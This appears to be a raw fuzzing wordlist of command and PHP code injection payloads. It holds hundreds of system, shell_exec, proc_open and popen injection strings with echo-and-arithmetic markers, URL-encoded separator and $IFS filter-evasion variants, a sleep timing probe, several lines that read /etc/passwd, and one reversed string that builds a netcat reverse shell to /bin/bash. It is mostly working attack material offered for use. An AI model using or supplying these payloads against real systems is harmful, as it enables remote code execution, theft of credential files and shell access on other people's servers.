$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
$(`cat /etc/passwd`)
$(`dir`)
$(echo SYCGSY > SYCGSY.txt)
${popen(print(`echo SLXBWN%0aecho $((29+57))%0aecho SLXBWN%0aecho SLXBWN`);%2529%257DSLXBWN
${popen(print(`echo TBFYMH\necho $((44+94))\necho TBFYMH\necho TBFYMH`);TBFYMH
${popen(print(`echo UQCXVD\necho $((60+78))\necho UQCXVD\necho UQCXVD`);%25255C%25255CUQCXVD
${popen(print(`echo UWOAFS%0aecho $((11+42))%0aecho UWOAFS%0aecho UWOAFS`);%2523UWOAFS
${popen(print(`echo UYCUPP;echo $((99+36));echo UYCUPP;echo UYCUPP`);//UYCUPP
${popen(print(`echo VDXXJI;echo $((50+12));echo VDXXJI;echo VDXXJI`);#VDXXJI
${popen(print(`echo VGNVLG`.`echo $((76+39))`.`echo VGNVLG`.`echo VGNVLG`);VGNVLG
${popen(print(`echo XGFDZU`.`echo $((14+6))`.`echo XGFDZU`.`echo XGFDZU`);#XGFDZU
${popen(print(`echo XZRRJD`.`echo $((95+86))`.`echo XZRRJD`.`echo XZRRJD`);.'XZRRJD
${popen(print(`echo YYAFET`.`echo $((62+68))`.`echo YYAFET`.`echo YYAFET`);\\YYAFET
${popen(print(`echo ZTPGAU\necho $((52+3))\necho ZTPGAU\necho ZTPGAU`);.%252527ZTPGAU
$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
;${@print(md5(RCEVulnerable))};
${@print("RCEVulnerable")}
${@print(system($_SERVER['HTTP_USER_AGENT']))}
${proc_open(print(`echo BBSVGQ`.`echo $((42+81))`.`echo BBSVGQ`.`echo BBSVGQ`);#BBSVGQ
${proc_open(print(`echo BPIHJI%0aecho $((94+16))%0aecho BPIHJI%0aecho BPIHJI`);%2523BPIHJI
${proc_open(print(`echo BUFRZN`.`echo $((99+37))`.`echo BUFRZN`.`echo BUFRZN`);\\BUFRZN
${proc_open(print(`echo CPKMZS`.`echo $((71+91))`.`echo CPKMZS`.`echo CPKMZS`);.'CPKMZS
${proc_open(print(`echo EALLNU`.`echo $((18+91))`.`echo EALLNU`.`echo EALLNU`))}EALLNU
${proc_open(print(`echo EBZMPW\necho $((54+99))\necho EBZMPW\necho EBZMPW`);.%252522EBZMPW
${proc_open(print(`echo FCANMP\necho $((61+35))\necho FCANMP\necho FCANMP`);FCANMP
${proc_open(print(`echo GSEIBK\necho $((71+35))\necho GSEIBK\necho GSEIBK`);%252529%25257DGSEIBK
${proc_open(print(`echo HEDLVC%0aecho $((95+18))%0aecho HEDLVC%0aecho HEDLVC`);//HEDLVC
${proc_open(print(`echo HWBQFG;echo $((79+43));echo HWBQFG;echo HWBQFG`);.'HWBQFG
${proc_open(print(`echo JQUEEX\necho $((81+77))\necho JQUEEX\necho JQUEEX`);.%252527JQUEEX
${proc_open(print(`echo JXTIWP%0aecho $((97+60))%0aecho JXTIWP%0aecho JXTIWP`);.%2522JXTIWP
${proc_open(print(`echo KDOEOK`.`echo $((74+18))`.`echo KDOEOK`.`echo KDOEOK`);//KDOEOK
${proc_open(print(`echo KNDTDG\necho $((98+53))\necho KNDTDG\necho KNDTDG`);//KNDTDG
${proc_open(print(`echo KZLOGK`.`echo $((4+23))`.`echo KZLOGK`.`echo KZLOGK`);."KZLOGK
${proc_open(print(`echo LUFXAF;echo $((85+77));echo LUFXAF;echo LUFXAF`);#LUFXAF
${proc_open(print(`echo MLSOYZ;echo $((72+12));echo MLSOYZ;echo MLSOYZ`);."MLSOYZ
${proc_open(print(`echo RMMUOG;echo $((61+62));echo RMMUOG;echo RMMUOG`);)}RMMUOG
${proc_open(print(`echo RTNMAU;echo $((3+92));echo RTNMAU;echo RTNMAU`);//RTNMAU
${proc_open(print(`echo SKXDUS;echo $((67+97));echo SKXDUS;echo SKXDUS`);\\SKXDUS
${proc_open(print(`echo SQZPMJ%0aecho $((94+63))%0aecho SQZPMJ%0aecho SQZPMJ`);%255C%255CSQZPMJ
${proc_open(print(`echo SRVISB\necho $((34+18))\necho SRVISB\necho SRVISB`);%252523SRVISB
${proc_open(print(`echo TDPGNL%0aecho $((89+52))%0aecho TDPGNL%0aecho TDPGNL`);.%2527TDPGNL
${proc_open(print(`echo TIYJYD`.`echo $((86+26))`.`echo TIYJYD`.`echo TIYJYD`);TIYJYD
${proc_open(print(`echo TWETUM%0aecho $((82+35))%0aecho TWETUM%0aecho TWETUM`);%2529%257DTWETUM
${proc_open(print(`echo WMSMFM%0aecho $((4+30))%0aecho WMSMFM%0aecho WMSMFM`);WMSMFM
${proc_open(print(`echo XAKQYF;echo $((41+51));echo XAKQYF;echo XAKQYF`);XAKQYF
${proc_open(print(`echo ZMUKGP\necho $((9+61))\necho ZMUKGP\necho ZMUKGP`);%25255C%25255CZMUKGP
${shell_exec(print(`echo BMQBVJ;echo $((82+52));echo BMQBVJ;echo BMQBVJ`);.'BMQBVJ
${shell_exec(print(`echo CKFBET`.`echo $((33+76))`.`echo CKFBET`.`echo CKFBET`);.'CKFBET
${shell_exec(print(`echo CTGKDZ`.`echo $((66+54))`.`echo CTGKDZ`.`echo CTGKDZ`);//CTGKDZ
${shell_exec(print(`echo CVXUUB\necho $((15+41))\necho CVXUUB\necho CVXUUB`);//CVXUUB
${shell_exec(print(`echo DPVESG%0aecho $((76+66))%0aecho DPVESG%0aecho DPVESG`);%2529%257DDPVESG
${shell_exec(print(`echo EDDLOS;echo $((48+73));echo EDDLOS;echo EDDLOS`);//EDDLOS
${shell_exec(print(`echo EINNUI;echo $((9+15));echo EINNUI;echo EINNUI`);#EINNUI
${shell_exec(print(`echo FBJSWR%0aecho $((91+71))%0aecho FBJSWR%0aecho FBJSWR`);%2523FBJSWR
${shell_exec(print(`echo FDGAHQ`.`echo $((87+87))`.`echo FDGAHQ`.`echo FDGAHQ`);FDGAHQ
${shell_exec(print(`echo HULCYO%0aecho $((33+24))%0aecho HULCYO%0aecho HULCYO`);//HULCYO
${shell_exec(print(`echo KIACLJ%0aecho $((8+79))%0aecho KIACLJ%0aecho KIACLJ`);.%2522KIACLJ
${shell_exec(print(`echo KRLQHL\necho $((37+53))\necho KRLQHL\necho KRLQHL`);%25255C%25255CKRLQHL
${shell_exec(print(`echo LTJDND\necho $((85+41))\necho LTJDND\necho LTJDND`);LTJDND
${shell_exec(print(`echo MVSQEI;echo $((38+17));echo MVSQEI;echo MVSQEI`);\\MVSQEI
${shell_exec(print(`echo NHQIAE\necho $((63+50))\necho NHQIAE\necho NHQIAE`);.%252522NHQIAE
${shell_exec(print(`echo NSLPBW`.`echo $((95+54))`.`echo NSLPBW`.`echo NSLPBW`);\\NSLPBW
${shell_exec(print(`echo NTILFZ%0aecho $((24+1))%0aecho NTILFZ%0aecho NTILFZ`);NTILFZ
${shell_exec(print(`echo OAPDKW;echo $((19+47));echo OAPDKW;echo OAPDKW`);OAPDKW
${shell_exec(print(`echo OYNPCP;echo $((84+51));echo OYNPCP;echo OYNPCP`);)}OYNPCP
${shell_exec(print(`echo PWWUEN`.`echo $((49+57))`.`echo PWWUEN`.`echo PWWUEN`))}PWWUEN
${shell_exec(print(`echo QQZSXU\necho $((69+44))\necho QQZSXU\necho QQZSXU`);%252523QQZSXU
${shell_exec(print(`echo RJFPQU\necho $((15+60))\necho RJFPQU\necho RJFPQU`);%252529%25257DRJFPQU
${shell_exec(print(`echo SICOKB`.`echo $((59+30))`.`echo SICOKB`.`echo SICOKB`);#SICOKB
${shell_exec(print(`echo VBRHZS\necho $((17+48))\necho VBRHZS\necho VBRHZS`);.%252527VBRHZS
${shell_exec(print(`echo VEKGIY%0aecho $((15+47))%0aecho VEKGIY%0aecho VEKGIY`);.%2527VEKGIY
${shell_exec(print(`echo VZXASO%0aecho $((97+88))%0aecho VZXASO%0aecho VZXASO`);%255C%255CVZXASO
${shell_exec(print(`echo WBZBZE;echo $((19+87));echo WBZBZE;echo WBZBZE`);."WBZBZE
${shell_exec(print(`echo ZEVNBY`.`echo $((97+49))`.`echo ZEVNBY`.`echo ZEVNBY`);."ZEVNBY
 {${sleep(20)}}
${system(print(`echo ARCVVC;echo $((7+90));echo ARCVVC;echo ARCVVC`);."ARCVVC
${system(print(`echo CKLWBH%0aecho $((38+7))%0aecho CKLWBH%0aecho CKLWBH`);.%2522CKLWBH
${system(print(`echo CPHTNC`.`echo $((73+50))`.`echo CPHTNC`.`echo CPHTNC`);\\CPHTNC
${system(print(`echo CTDUTJ\necho $((30+48))\necho CTDUTJ\necho CTDUTJ`);CTDUTJ
${system(print(`echo CZASPT\necho $((18+64))\necho CZASPT\necho CZASPT`);.%252522CZASPT
${system(print(`echo DDVDPM%0aecho $((1+17))%0aecho DDVDPM%0aecho DDVDPM`);%2529%257DDDVDPM
${system(print(`echo EDIEDW%0aecho $((27+90))%0aecho EDIEDW%0aecho EDIEDW`);EDIEDW
${system(print(`echo EZFNSE;echo $((38+74));echo EZFNSE;echo EZFNSE`);)}EZFNSE
${system(print(`echo FTPLBI;echo $((56+37));echo FTPLBI;echo FTPLBI`);.'FTPLBI
${system(print(`echo GVUXPA;echo $((23+14));echo GVUXPA;echo GVUXPA`);\\GVUXPA
${system(print(`echo IWAAGD\necho $((70+17))\necho IWAAGD\necho IWAAGD`);.%252527IWAAGD
${system(print(`echo JJXLFR`.`echo $((84+45))`.`echo JJXLFR`.`echo JJXLFR`);//JJXLFR
${system(print(`echo LHBYTT\necho $((48+0))\necho LHBYTT\necho LHBYTT`);%25255C%25255CLHBYTT
${system(print(`echo LWTWCT;echo $((98+35));echo LWTWCT;echo LWTWCT`);#LWTWCT
${system(print(`echo LXHYXF\necho $((50+90))\necho LXHYXF\necho LXHYXF`);//LXHYXF
${system(print(`echo MAFXYF%0aecho $((23+63))%0aecho MAFXYF%0aecho MAFXYF`);//MAFXYF
${system(print(`echo MQQJPG\necho $((72+19))\necho MQQJPG\necho MQQJPG`);%252523MQQJPG
${system(print(`echo QIHVTW`.`echo $((76+48))`.`echo QIHVTW`.`echo QIHVTW`);QIHVTW
${system(print(`echo QXZKBZ;echo $((59+25));echo QXZKBZ;echo QXZKBZ`);//QXZKBZ
${system(print(`echo RKLPMM%0aecho $((66+91))%0aecho RKLPMM%0aecho RKLPMM`);.%2527RKLPMM
${system(print(`echo RSGSZK%0aecho $((0+7))%0aecho RSGSZK%0aecho RSGSZK`);%2523RSGSZK
${system(print(`echo TDEKPW`.`echo $((36+67))`.`echo TDEKPW`.`echo TDEKPW`);.'TDEKPW
${system(print(`echo WJAMJI`.`echo $((95+52))`.`echo WJAMJI`.`echo WJAMJI`);."WJAMJI
${system(print(`echo XPECBV`.`echo $((14+77))`.`echo XPECBV`.`echo XPECBV`);#XPECBV
${system(print(`echo YHCDBT%0aecho $((19+19))%0aecho YHCDBT%0aecho YHCDBT`);%255C%255CYHCDBT
${system(print(`echo YVOAMZ;echo $((9+69));echo YVOAMZ;echo YVOAMZ`);YVOAMZ
${system(print(`echo YYSFAL\necho $((70+5))\necho YYSFAL\necho YYSFAL`);%252529%25257DYYSFAL
${system(print(`echo ZYLUET`.`echo $((5+56))`.`echo ZYLUET`.`echo ZYLUET`))}ZYLUET
$u/bin$u/cat$u $u/etc$u/passwd$u
;+$u+cat+/etc$u/passwd+\#
;+$u+cat+/etc$u/passwd$u
$;/usr/bin/id
%0a ls -la
%0Acat /etc/passwd
"%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
&%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
&&%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
'%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
;%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
|%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
||%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH"
"%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
"%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
&&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
&&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
'%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
'%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
;%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
;%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
|%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
|%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
||%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#
||%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\
"%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
&%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
&&%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
'%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
;%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
|%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
||%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|
"%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
&%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
&&%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
'%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
;%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
|%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
||%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\
"%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
&%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
&&%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
'%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
;%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
|%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
||%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//
"%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
&%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
&&%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
'%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
;%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
|%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
||%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
"%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
&%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
&&%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
'%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
;%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
|%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
||%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&
"%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
&%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
&&%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
'%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
;%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
|%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
||%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ
"%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
&%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
&&%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
'%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
;%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
|%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
||%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH"
"%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
"%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
&&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
&&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\
'%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#
